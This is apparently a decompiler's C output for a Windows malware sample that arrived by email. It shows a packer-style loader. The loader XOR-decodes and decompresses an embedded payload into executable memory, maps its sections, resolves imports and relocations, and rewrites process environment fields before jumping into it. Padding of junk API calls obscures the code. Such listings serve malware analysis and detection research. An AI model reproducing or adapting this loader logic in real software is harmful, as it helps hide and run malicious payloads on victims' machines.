// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1067/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401050(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	GetCommandLineA();
	word32 dwLoc08_10 = 0x00000000;
	while (dwLoc08_10 < dwArg0C)
	{
		Mem30[dwArg04 + dwLoc08_10:byte] = Mem0[dwArg08 + dwLoc08_10:byte];
		dwLoc08_10 = dwLoc08_10 + 0x00000001;
	}
	return;
}

void fn00401190(word32 ebx, word32 esi, word32 edi, selector fs, word32 dwArg04)
{
	COMCTL32.dll!Ordinal_17();
	word32 eax_20 = GetModuleHandleA(0x00000000);
	if (RegOpenKeyA(0x80000002, 0x00408FA0, fp - 0x0000001C) != 0x00000000)
	{
		Mem62[fp - 0x00000040:word32] = 0x004010D0;
		Mem64[fp - 0x00000044:word32] = 0x00000000;
		DialogBoxParamA(eax_20, 0x000003E8, 0x80000002, 0x00408FA0, 0x00000000);
		return;
	}
	else
	{
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		if ((dwArg04 & 0x0000FFFF) != 0x00000000)
			Mem312[0x00409044:word32] = 0x00000000;
		else
			Mem313[0x00409044:word32] = 0x00000001;
		if (Mem0[0x00409044:word32] != 0x00000000)
			Mem311[0x00409034:word32] = dwArg04;
		word32 edx_195 = Mem0[0x00405000:word32];
		word32 ecx_198 = Mem0[0x00405004:word32];
		word32 dwLoc08_200 = 0x00000000;
		while (dwLoc08_200 <u edx_195)
		{
			Mem214[dwLoc08_200 + 0x00405000 + 0x00000008:word32] = Mem0[dwLoc08_200 + 0x00405000 + 0x00000008:word32] ^ 0x00002B67;
			dwLoc08_200 = dwLoc08_200 + 0x00000008;
		}
		Mem224[0x00409040:word32] = fn00402020(ecx_198);
		Mem230[fp - 0x00000040:word32] = Mem224[0x00409040:word32];
		Mem235[fp - 0x00000044:word32] = 0x00405008;
		fn004021D0(0x80000002, 0x00408FA0, edx_195);
		Mem238[0x00409030:word32] = edi;
		Mem239[0x0040902C:word32] = esi;
		Mem240[0x0040903C:word32] = ebx;
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		GetCommandLineA();
		Mem271[0x00409048:word32] = Mem240[fs:0x00000018:word32];
		Mem275[0x00409038:word32] = fp - 0x00000004;
		if (Mem275[0x00409044:word32] != 0x00000000)
			fn00402050(0x004015C7 - dwArg04, dwArg04);
		else
			fn00402050(0x004015C7 - eax_20, eax_20);
		word32 eax_279 = Mem275[0x00409040:word32];
		fn00401620(fp - 0x00000004, eax_279);
		Mem275[0x0040904C:word32]();
		return;
	}
}

word32 fn00401600(word32 dwArg04, word32 dwArg08)
{
	return GetProcAddress(dwArg04, dwArg08);
}

void fn00401620(word32 ebp, word32 dwArg04)
{
	word32 edx_16 = dwArg04 + Mem0[dwArg04 + 0x0000003C:word32];
	word32 dwLoc24_124 = edx_16 + 0x00000018 + (word32) Mem0[edx_16 + 0x00000014:word16];
	word32 eax_33 = VirtualAlloc(0x00000000, Mem0[edx_16 + 0x00000050:word32], 0x00003000, 0x00000040);
	if (eax_33 == 0x00000000)
		;
	else
	{
		Mem109[fp - 0x00000058:word32] = Mem0[dwArg04 + 0x0000003C:word32] + 0x00000138 + (word32) Mem0[edx_16 + 0x00000006:word16] *s 0x00000028;
		Mem112[fp - 0x0000005C:word32] = dwArg04;
		fn00401050(eax_33, 0x00003000, 0x00000040);
		word32 dwLoc0C_118 = 0x00000000;
		while (dwLoc0C_118 <u (word32) Mem112[edx_16 + 0x00000006:word16])
		{
			Mem132[fp - 0x00000048:word32] = 0x00000000;
			if (Mem132[dwLoc24_124 + 0x00000014:word32] != 0x00000000 && Mem132[dwLoc24_124 + 0x00000010:word32] != 0x00000000)
			{
				word32 eax_159 = Mem132[dwLoc24_124 + 0x00000010:word32] - 0x00000001 + Mem132[edx_16 + 0x0000003C:word32];
				fn00401050(eax_33 + Mem132[dwLoc24_124 + 0x0000000C:word32], dwArg04 + Mem132[dwLoc24_124 + 0x00000014:word32], SEQ(SEQ(0x00000000, eax_159) % Mem132[edx_16 + 0x0000003C:word32], eax_159) /u Mem132[edx_16 + 0x0000003C:word32] *s Mem132[edx_16 + 0x0000003C:word32]);
			}
			dwLoc24_124 = dwLoc24_124 + 0x00000028;
			dwLoc0C_118 = dwLoc0C_118 + 0x00000001;
		}
		word32 ecx_187 = eax_33 + Mem112[eax_33 + 0x0000003C:word32];
		word32 eax_192 = Mem112[ecx_187 + 0x00000050:word32];
		Mem198[fp - 0x00000064:word32] = 0x00000004;
		word32 eax_203 = CreateFileMappingA(0xFFFFFFFF, 0x00000000, 0x00000000, 0x00000000, eax_192, 0x00000000);
		if (eax_203 == 0x00000000)
			;
		else
		{
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			GetCommandLineA();
			word32 dwLoc44_402 = eax_33 + Mem198[ecx_187 + 0x00000080:word32];
			while (Mem198[dwLoc44_402 + 0x00000010:word32] != 0x00000000)
			{
				word32 dwLoc30_431;
				word32 dwLoc20_430;
				word32 eax_424 = LoadLibraryA(eax_33 + Mem198[dwLoc44_402 + 0x0000000C:word32]);
				if (Mem198[dwLoc44_402 + 0x00000000:word32] != 0x00000000)
				{
					dwLoc20_430 = eax_33 + Mem198[dwLoc44_402 + 0x00000000:word32];
					dwLoc30_431 = eax_33 + Mem198[dwLoc44_402 + 0x00000010:word32];
				}
				else
				{
					dwLoc20_430 = eax_33 + Mem198[dwLoc44_402 + 0x00000010:word32];
					dwLoc30_431 = eax_33 + Mem198[dwLoc44_402 + 0x00000000:word32];
				}
				if (Mem198[dwLoc44_402 + 0x00000010:word32] != 0x00000000 && Mem198[dwLoc44_402 + 0x00000000:word32] != 0x00000000)
				{
					Mem519[fp - 0x00000014:word32] = 0x00000001;
					goto l00401C37;
				}
l00401C37:
				while (Mem198[dwLoc20_430 + 0x00000000:word32] != 0x00000000)
				{
					if ((Mem198[dwLoc20_430 + 0x00000000:word32] & 0x80000000) != 0x00000000)
						Mem497[dwLoc20_430 + 0x00000000:word32] = fn00401600(eax_424, Mem198[dwLoc20_430 + 0x00000000:word32] & 0x7FFFFFFF);
					else
						Mem511[dwLoc20_430 + 0x00000000:word32] = fn00401600(eax_424, Mem198[dwLoc20_430 + 0x00000000:word32] + 0x00000002 + eax_33);
					if (Mem198[dwLoc20_430 + 0x00000000:word32] == 0x00000000)
						goto l00401FA3;
					if (0x00000000 != 0x00000000)
						Mem482[dwLoc30_431 + 0x00000000:word32] = Mem198[dwLoc20_430 + 0x00000000:word32];
					dwLoc20_430 = dwLoc20_430 + 0x00000004;
					dwLoc30_431 = dwLoc30_431 + 0x00000004;
				}
				dwLoc44_402 = dwLoc44_402 + 0x00000014;
			}
			if (Mem198[0x00409044:word32] != 0x00000000)
			{
				word32 edx_827 = Mem198[0x00409034:word32] - Mem198[ecx_187 + 0x00000034:word32];
				if (Mem198[ecx_187 + 0x000000A4:word32] != 0x00000000)
				{
					word32 dwLoc1C_836 = eax_33 + Mem198[ecx_187 + 0x000000A0:word32];
					while (Mem198[dwLoc1C_836 + 0x00000004:word32] != 0x00000000)
					{
						word32 edx_851 = Mem198[dwLoc1C_836 + 0x00000004:word32] - 0x00000008 >>u 0x00000001;
						word32 eax_854 = dwLoc1C_836 + 0x00000008;
						word32 dwLoc0C_857 = 0x00000000;
						while (dwLoc0C_857 <u edx_851)
						{
							if ((word32) eax_854[dwLoc0C_857 * 0x0002] >> 0x0000000C == 0x00000003)
								Mem898[eax_33 + Mem198[dwLoc1C_836 + 0x00000000:word32] + ((word32) eax_854[dwLoc0C_857 * 0x0002] & 0x00000FFF):word32] = Mem198[eax_33 + Mem198[dwLoc1C_836 + 0x00000000:word32] + ((word32) eax_854[dwLoc0C_857 * 0x0002] & 0x00000FFF):word32] + edx_827;
							dwLoc0C_857 = dwLoc0C_857 + 0x00000001;
						}
						dwLoc1C_836 = dwLoc1C_836 + Mem198[dwLoc1C_836 + 0x00000004:word32];
					}
				}
			}
			word32 esp_570;
			word32 eax_557 = GetProcAddress(GetModuleHandleA(0x00408FC8), 0x00408FB8);
			if (Mem198[0x00409044:word32] != 0x00000000)
			{
				word32 edx_794 = Mem198[0x00409034:word32];
				Mem796[fp - 0x00000058:word32] = edx_794;
				Mem800[fp - 0x00000060:word32] = 0x00000000;
				Mem802[fp - 0x00000064:word32] = 0x00000000;
				Mem804[fp - 0x00000068:word32] = 0x00000022;
				Mem807[fp - 0x0000006C:word32] = eax_203;
				esp_570 = fp - 0x0000006C;
				eax_557();
				Mem808[0x00409028:word32] = eax_203;
			}
			else
			{
				word32 edx_810 = Mem198[ecx_187 + 0x00000034:word32];
				Mem812[fp - 0x00000058:word32] = edx_810;
				Mem816[fp - 0x00000060:word32] = 0x00000000;
				Mem818[fp - 0x00000064:word32] = 0x00000000;
				Mem820[fp - 0x00000068:word32] = 0x00000022;
				Mem823[fp - 0x0000006C:word32] = eax_203;
				esp_570 = fp - 0x0000006C;
				eax_557();
				Mem824[0x00409028:word32] = eax_203;
			}
			if (Mem198[0x00409028:word32] == 0x00000000)
			{
				word32 esp_662;
				word32 eax_634 = GetProcAddress(GetModuleHandleA(0x00408FE8), 0x00408FD8);
				word32 eax_645 = GetProcAddress(GetModuleHandleA(0x00409004), 0x00408FF8);
				if (Mem198[0x00409044:word32] != 0x00000000)
				{
					word32 ecx_737 = Mem198[0x00409034:word32];
					Mem739[fp - 0x00000070:word32] = ecx_737;
					esp_662 = fp - 0x00000070;
					eax_634();
					if (eax_645 == 0x00000000)
					{
						esp_662 = fp - 0x0000007C;
						eax_645();
						if (eax_645 == 0x00000000)
							;
						else
						{
l00401E72:
l00401E9E:
							if (Mem198[0x00409044:word32] != 0x00000000)
							{
								word32 ecx_706 = Mem198[0x00409034:word32];
								word32 esp_707 = esp_662 - 0x00000004;
								Mem708[esp_707 + 0x00000000:word32] = ecx_706;
								Mem710[esp_707 - 0x00000004:word32] = 0x00000000;
								Mem712[esp_707 - 0x00000008:word32] = 0x00000000;
								Mem714[esp_707 - 0x0000000C:word32] = 0x00000000;
								Mem716[esp_707 - 0x00000010:word32] = 0x00000022;
								Mem719[esp_707 - 0x00000014:word32] = eax_203;
								esp_570 = esp_707 - 0x00000014;
								eax_557();
								Mem720[0x00409028:word32] = eax_645;
							}
							else
							{
								word32 ecx_722 = Mem198[ecx_187 + 0x00000034:word32];
								word32 esp_723 = esp_662 - 0x00000004;
								Mem724[esp_723 + 0x00000000:word32] = ecx_722;
								Mem726[esp_723 - 0x00000004:word32] = 0x00000000;
								Mem728[esp_723 - 0x00000008:word32] = 0x00000000;
								Mem730[esp_723 - 0x0000000C:word32] = 0x00000000;
								Mem732[esp_723 - 0x00000010:word32] = 0x00000022;
								Mem735[esp_723 - 0x00000014:word32] = eax_203;
								esp_570 = esp_723 - 0x00000014;
								eax_557();
								Mem736[0x00409028:word32] = ecx_187;
							}
							if (Mem198[0x00409028:word32] == 0x00000000)
								if (Mem198[0x00409044:word32] == 0x00000000)
								{
									word32 esp_677 = esp_570 - 0x00000004;
									Mem678[esp_677 + 0x00000000:word32] = 0x00000040;
									Mem680[esp_677 - 0x00000004:word32] = 0x00003000;
									Mem684[esp_677 - 0x00000008:word32] = Mem680[ecx_187 + 0x00000050:word32];
									Mem688[esp_677 - 0x0000000C:word32] = Mem684[ecx_187 + 0x00000034:word32];
									Mem691[0x00409028:word32] = VirtualAlloc(Mem688[esp_677 - 0x0000000C:LPVOID], Mem688[esp_677 - 8:SIZE_T], Mem688[esp_677 - 4:DWORD], Mem688[esp_677 + 0x00000000:DWORD]);
									esp_570 = esp_677 + 0x00000004;
								}
								else
								{
									word32 esp_692 = esp_570 - 0x00000004;
									Mem693[esp_692 + 0x00000000:word32] = 0x00000040;
									Mem695[esp_692 - 0x00000004:word32] = 0x00003000;
									Mem699[esp_692 - 0x00000008:word32] = Mem695[ecx_187 + 0x00000050:word32];
									Mem702[esp_692 - 0x0000000C:word32] = Mem699[0x00409034:word32];
									Mem705[0x00409028:word32] = VirtualAlloc(Mem702[esp_692 - 0x0000000C:LPVOID], Mem702[esp_692 - 8:SIZE_T], Mem702[esp_692 - 4:DWORD], Mem702[esp_692 + 0x00000000:DWORD]);
									esp_570 = esp_692 + 0x00000004;
								}
l00401F32:
							word32 esp_587 = esp_570 - 0x00000004;
							Mem588[esp_587 + 0x00000000:word32] = Mem198[ecx_187 + 0x00000050:word32];
							Mem591[esp_587 - 0x00000004:word32] = eax_33;
							Mem594[esp_587 - 0x00000008:word32] = Mem591[0x00409028:word32];
							fn00401050(dwArg00, dwArg04, dwArg08);
							if (Mem594[0x00409044:word32] != 0x00000000)
							{
								Mem615[esp_587 + 0x00000000:word32] = Mem594[0x00409028:word32] + Mem594[ecx_187 + 0x00000028:word32];
								Mem618[esp_587 - 0x00000004:word32] = Mem615[0x00409034:word32];
								fn00401FB0(dwArg00, dwArg04);
							}
							else
							{
								Mem623[esp_587 + 0x00000000:word32] = Mem594[0x00409028:word32];
								fn004021A0(dwArg00);
							}
							Mem605[0x0040904C:word32] = Mem594[0x00409028:word32] + Mem594[ecx_187 + 0x00000028:word32];
							Mem608[ecx_187 + 0x00000028:word32] = Mem605[0x0040904C:word32];
						}
					}
					else
						goto l00401E72;
				}
				else
				{
					word32 ecx_773 = Mem198[ecx_187 + 0x00000034:word32];
					Mem775[fp - 0x00000070:word32] = ecx_773;
					eax_645 = ecx_187;
					esp_662 = fp - 0x00000070;
					eax_634();
					if (ecx_187 == 0x00000000)
					{
						eax_645 = Mem775[ecx_187 + 0x00000034:word32];
						esp_662 = fp - 0x0000007C;
						eax_645();
						if (eax_645 == 0x00000000)
							;
						else
							goto l00401E9E;
					}
					else
						goto l00401E9E;
				}
			}
			else
				goto l00401F32;
		}
	}
l00401FA3:
	return;
}

void fn00401FB0(word32 dwArg04, word32 dwArg08)
{
	word32 ecx_14 = Mem0[Mem0[Mem0[Mem0[0x00409048:word32] + 0x00000030:word32] + 0x0000000C:word32] + 0x0000000C:word32];
	word32 dwLoc0C_15 = ecx_14;
	while (0x00000001 != 0x00000000)
	{
		if (dwLoc0C_15 == 0x00000000)
			goto l0040201C;
		if (Mem0[dwLoc0C_15 + 0x00000018:word32] == dwArg04)
		{
			Mem50[dwLoc0C_15 + 0x0000001C:word32] = dwArg08;
			goto l0040201C;
		}
		word32 eax_53 = Mem0[dwLoc0C_15 + 0x00000000:word32];
		dwLoc0C_15 = eax_53;
		if (eax_53 == ecx_14)
			goto l0040201C;
	}
l0040201C:
	return;
}

word32 fn00402020(word32 dwArg04)
{
	return HeapAlloc(GetProcessHeap(), 0x00000000, dwArg04);
}

void fn00402050(word32 dwArg04, word32 dwArg08)
{
fn00402050_entry:
l00402050:
	word32 dwLoc20_13
	branch Mem0[0x00409044:word32] == 0x00000000 l0040206A
l00402060:
	dwLoc20_13 = Mem0[0x00409034:word32]
	goto l00402070
l0040206A:
	dwLoc20_13 = dwArg08
l00402070:
	word32 eax_16 = dwLoc20_13 + Mem0[dwLoc20_13 + 0x0000003C:word32]
	Mem30[0x00409028:word32] = VirtualAlloc(0x00000000, Mem0[eax_16 + 0x00000050:word32], 0x00003000, 0x00000040)
	branch Mem30[0x00409028:word32] != 0x00000000 l004020AA
l004020A0:
	goto l00402199
l004020AA:
	Mem41[fp - 0x00000028:word32] = Mem30[eax_16 + 0x00000050:word32]
	Mem44[fp - 0x0000002C:word32] = dwLoc20_13
	fn00401050(Mem44[0x00409028:word32], 0x00003000, 0x00000040)
	word32 ecx_50 = Mem44[0x00409028:word32] - dwLoc20_13
	branch Mem44[eax_16 + 0x000000A4:word32] == 0x00000000 l0040218E
l004020DF:
	word32 dwLoc0C_144 = dwLoc20_13 + Mem44[eax_16 + 0x000000A0:word32]
l004020EE:
	branch Mem44[dwLoc0C_144 + 0x00000004:word32] == 0x00000000 l0040218E
l004020FB:
	word32 ecx_92 = Mem44[dwLoc0C_144 + 0x00000004:word32] - 0x00000008 >>u 0x00000001
	word32 edx_95 = dwLoc0C_144 + 0x00000008
	word32 dwLoc08_101 = 0x00000000
	goto l00402124
l0040211B:
	dwLoc08_101 = dwLoc08_101 + 0x00000001
l00402124:
	branch dwLoc08_101 >=u ecx_92 l0040217D
l0040212C:
	branch (word32) edx_95[dwLoc08_101 * 0x0002] >> 0x0000000C != 0x00000003 l0040217B
l0040213E:
	Mem139[Mem44[0x00409028:word32] + Mem44[dwLoc0C_144 + 0x00000000:word32] + ((word32) edx_95[dwLoc08_101 * 0x0002] & 0x00000FFF):word32] = Mem44[Mem44[0x00409028:word32] + Mem44[dwLoc0C_144 + 0x00000000:word32] + ((word32) edx_95[dwLoc08_101 * 0x0002] & 0x00000FFF):word32] + ecx_50
l0040217B:
	goto l0040211B
l0040217D:
	dwLoc0C_144 = dwLoc0C_144 + Mem44[dwLoc0C_144 + 0x00000004:word32]
	goto l004020EE
l0040218E:
l00402199:
	return
fn00402050_exit:
}

void fn004021A0(word32 dwArg04)
{
	word32 eax_7 = Mem0[0x00409048:word32];
	Mem13[Mem0[eax_7 + 0x00000030:word32] + 0x00000008:word32] = dwArg04;
	return;
}

word32 fn004021D0(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	word32 dwLoc0C_117 = 0x00000001;
	byte cl_12 = Mem0[dwArg04 + 0x00000000:byte];
	word32 dwLoc18_123 = 0x00000000;
	do
	{
		word32 ecx_112;
		word32 ecx_33 = dwLoc0C_117 + 0x00000001;
		byte al_30 = Mem0[dwArg04 + dwLoc0C_117:byte];
		dwLoc0C_117 = ecx_33;
		if ((word32) al_30 == (word32) cl_12)
		{
			word32 ecx_59 = dwArg04 + ecx_33;
			if ((word32) Mem0[ecx_59 + 0x00000000:byte] == 0x00000000)
			{
				Mem82[dwArg08 + dwLoc18_123:byte] = cl_12;
				ecx_112 = DPB(ecx_59, cl_12, 0, 8);
				dwLoc18_123 = dwLoc18_123 + 0x00000001;
				dwLoc0C_117 = ecx_33 + 0x00000001;
			}
			else
			{
				word32 ecx_98;
				word32 eax_101 = fn004022D0(fp - 0x00000010, dwArg04 + ecx_33, out ecx_98) + ecx_33;
				dwLoc0C_117 = fn004022D0(fp - 0x00000020, dwArg04 + eax_101, out ecx_112) + eax_101;
				word32 dwLoc1C_118 = 0x00000000;
				while (dwLoc1C_118 <u dwLoc10)
				{
					word32 ecx_130 = dwLoc18_123 - dwLoc20;
					byte cl_134 = Mem0[dwArg08 + ecx_130:byte];
					Mem136[dwArg08 + dwLoc18_123:byte] = cl_134;
					ecx_112 = DPB(ecx_130, cl_134, 0, 8);
					dwLoc18_123 = dwLoc18_123 + 0x00000001;
					dwLoc1C_118 = dwLoc1C_118 + 0x00000001;
				}
			}
		}
		else
		{
			Mem149[dwArg08 + dwLoc18_123:byte] = al_30;
			ecx_112 = DPB(dwLoc0C_117 + 0x00000001, al_30, 0, 8);
			dwLoc18_123 = dwLoc18_123 + 0x00000001;
		}
	} while (dwLoc0C_117 <u dwArg0C);
	return ecx_112;
}

word32 fn004022D0(word32 dwArg04, word32 dwArg08, ptr32 ecxOut)
{
	word32 dwLoc08_12 = 0x00000000;
	word32 dwLoc10_13 = 0x00000000;
	do
	{
		word32 ecx_16 = (word32) Mem0[dwArg08 + 0x00000000:byte];
		word32 eax_25 = dwLoc08_12 << 0x00000007 | ecx_16 & 0x0000007F;
		word32 edx_28 = dwLoc10_13 + 0x00000001;
		dwArg08 = dwArg08 + 0x00000001;
		dwLoc08_12 = eax_25;
		dwLoc10_13 = edx_28;
	} while ((ecx_16 & 0x00000080) != 0x00000000);
	Mem38[dwArg04 + 0x00000000:word32] = eax_25;
	word32 ecx_36;
	*ecxOut = dwArg04;
	return edx_28;
}

